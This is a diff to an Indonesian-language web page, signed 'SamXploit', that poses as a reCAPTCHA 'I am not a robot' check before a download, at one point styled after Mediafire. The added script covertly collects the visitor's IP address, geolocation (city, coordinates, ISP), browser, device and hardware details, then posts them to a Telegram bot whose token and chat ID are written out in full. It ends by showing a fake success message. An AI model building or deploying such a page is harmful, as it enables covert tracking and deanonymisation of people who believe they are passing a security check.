@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Verifikasi Mediafire</title>
+  <title>Verifikasi Robot</title>
   <style>
     body {
       margin: 0;
@@ -14,69 +14,152 @@
       justify-content: center;
       align-items: center;
       height: 100vh;
+      text-align: center;
     }
 
     .box {
-      background: rgba(255, 255, 255, 0.1);
-      backdrop-filter: blur(10px);
+      background: rgba(255,255,255,0.1);
+      backdrop-filter: blur(12px);
       border-radius: 12px;
       padding: 30px;
-      text-align: center;
-      box-shadow: 0 0 20px rgba(0,0,0,0.3);
+      max-width: 450px;
       width: 90%;
-      max-width: 400px;
+      box-shadow: 0 0 20px rgba(0,0,0,0.3);
     }
 
-    .box h2 {
-      margin-bottom: 15px;
+    button {
+      margin-top: 20px;
+      padding: 12px 25px;
+      font-size: 16px;
+      font-weight: bold;
+      background: #00c853;
+      border: none;
+      color: white;
+      border-radius: 8px;
+      cursor: pointer;
+      transition: background 0.3s;
+      display: none;
     }
 
-    .box p {
-      margin-bottom: 25px;
+    button:hover {
+      background: #00b347;
     }
 
     .footer {
       position: absolute;
       bottom: 10px;
-      text-align: center;
       font-size: 13px;
-      color: white;
       opacity: 0.7;
       width: 100%;
+      color: white;
     }
   </style>
-  <!-- reCAPTCHA API -->
   <script src="https://www.google.com/recaptcha/api.js" async defer></script>
 </head>
 <body>
 
   <div class="box">
     <h2>🔐 Verifikasi Diperlukan</h2>
-    <p>Silakan verifikasi untuk melanjutkan ke halaman download.</p>
-    <div class="g-recaptcha" data-sitekey="6LdeHZArAAAAAFZT1atO2lPapq8V_sSs0nKE1Uba" data-callback="onVerified"></div>
+    <p>Silakan verifikasi di bawah untuk melanjutkan ke halaman download.</p>
+    <div class="g-recaptcha" data-sitekey="6LdeHZArAAAAAFZT1atO2lPapq8V_sSs0nKE1Uba" data-callback="showButton"></div>
+    <button id="btnVerif" onclick="verifikasi()">Saya bukan robot</button>
   </div>
 
   <div class="footer">
-    © 2025 SamXploit | Mirip Tampilan Mediafire + reCAPTCHA
+    © 2025 SamXploit | reCAPTCHA v2 + Info Lengkap
   </div>
 
   <script>
-    async function onVerified() {
-      const ip = await fetch('https://api.ipify.org?format=json')
-        .then(res => res.json())
-        .then(data => data.ip);
+    function showButton() {
+      document.getElementById('btnVerif').style.display = 'inline-block';
+    }
 
-      const userAgent = navigator.userAgent;
+    async function verifikasi() {
       const waktu = new Date().toLocaleString("id-ID");
+      const userAgent = navigator.userAgent;
+      const platform = navigator.platform;
+      const bahasa = navigator.language;
+      const bahasaAll = navigator.languages;
+      const layar = `${window.screen.width}x${window.screen.height}`;
+      const warna = screen.colorDepth + ' bit';
+      const online = navigator.onLine ? "Online" : "Offline";
+      const referrer = document.referrer || "Langsung (direct)";
+      const url = window.location.href;
+      const cookies = navigator.cookieEnabled ? "Ya" : "Tidak";
+      const memori = navigator.deviceMemory || "Tidak tersedia";
+      const cpu = navigator.hardwareConcurrency || "Tidak tersedia";
+      const webdriver = navigator.webdriver ? "Ya (BOT)" : "Tidak";
+      const sentuh = navigator.maxTouchPoints;
+      const dnt = navigator.doNotTrack;
+      const produk = navigator.product;
+      const versi = navigator.appVersion;
 
-      const pesan = `✅ *Verifikasi Berhasil*\n\n📌 IP: ${ip}\n📱 Perangkat: ${userAgent}\n🕒 Waktu: ${waktu}`;
+      let browser = "Tidak diketahui";
+      if (userAgent.includes("Chrome")) browser = "Chrome";
+      else if (userAgent.includes("Firefox")) browser = "Firefox";
+      else if (userAgent.includes("Safari") && !userAgent.includes("Chrome")) browser = "Safari";
+      else if (userAgent.includes("Edg")) browser = "Edge";
 
-      const BOT_TOKEN = 'ISI_BOT_TOKEN_KAMU';
-      const CHAT_ID = 'ISI_CHAT_ID_KAMU';
+      let os = "Tidak diketahui";
+      if (userAgent.includes("Windows")) os = "Windows";
+      else if (userAgent.includes("Android")) os = "Android";
+      else if (userAgent.includes("iPhone") || userAgent.includes("iPad")) os = "iOS";
+      else if (userAgent.includes("Linux")) os = "Linux";
+      else if (userAgent.includes("Mac OS")) os = "Mac OS";
+
+      const geo = await fetch('https://ipapi.co/json/')
+        .then(res => res.json())
+        .catch(() => ({}));
+
+      const ip = geo.ip || '-';
+      const negara = geo.country_name || '-';
+      const kode_negara = geo.country_code || '-';
+      const kota = geo.city || '-';
+      const region = geo.region || '-';
+      const postal = geo.postal || '-';
+      const org = geo.org || '-';
+      const lat = geo.latitude || '-';
+      const lon = geo.longitude || '-';
+      const zona = geo.timezone || '-';
+
+      const pesan = `🧠 *DATA PENGUNJUNG (Lengkap)*\n
+📌 IP: ${ip}
+🌍 Negara: ${negara} (${kode_negara})
+🏙 Kota: ${kota}
+📡 ISP: ${org}
+🧭 Wilayah: ${region} ${postal}
+🕓 Zona Waktu: ${zona}
+📍 Lokasi: ${lat}, ${lon}
+
+🖥 User-Agent: ${userAgent}
+🌐 Browser: ${browser}
+💻 OS: ${os}
+🪟 Platform: ${platform}
+🈯 Bahasa: ${bahasa}
+🌐 Bahasa Tambahan: ${bahasaAll}
+📏 Resolusi: ${layar}
+🎨 Warna: ${warna}
+📶 Online: ${online}
+🍪 Cookies Aktif: ${cookies}
+
+🔗 Referrer: ${referrer}
+📄 URL: ${url}
+⏰ Waktu Akses: ${waktu}
+
+🧠 Memori Device: ${memori} GB
+🧠 CPU Core: ${cpu}
+🤖 WebDriver/Bot: ${webdriver}
+👆 Touch Support: ${sentuh}
+🚫 Do Not Track: ${dnt}
+📦 Produk: ${produk}
+🔢 Versi: ${versi}`;
+
+      const BOT_TOKEN = '8072851009:AAHDsHyz5EgG2ThhEFAp_1QR1tQAQgcFr4M';
+      const CHAT_ID = '7625804862';
 
       fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
         method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
+        headers: {'Content-Type': 'application/json'},
         body: JSON.stringify({
           chat_id: CHAT_ID,
           text: pesan,
@@ -85,7 +168,7 @@
       });
 
       alert('✅ Verifikasi berhasil! Anda akan diarahkan ke halaman download.');
-      // window.location.href = 'https://link-download-kamu.com'; // opsional redirect
+      // window.location.href = "https://link-download.com"; // aktifkan jika ingin redirect
     }
   </script>
 
